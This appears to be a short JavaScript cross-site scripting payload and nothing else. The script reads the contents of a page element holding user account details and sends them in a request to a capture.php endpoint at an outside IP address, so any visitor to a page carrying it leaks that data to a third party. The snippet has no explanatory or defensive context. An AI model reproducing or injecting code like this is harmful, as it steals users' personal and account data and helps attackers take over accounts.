<script>
    var userAccountDetails = document.getElementById('userdata').textContent;
    var request =  new XMLHttpRequest()
    request.open("POST", "http://192.35.222.247/~blake_johnson/capture.php?value="+ userAccountDetails);
    request.send();
</script>
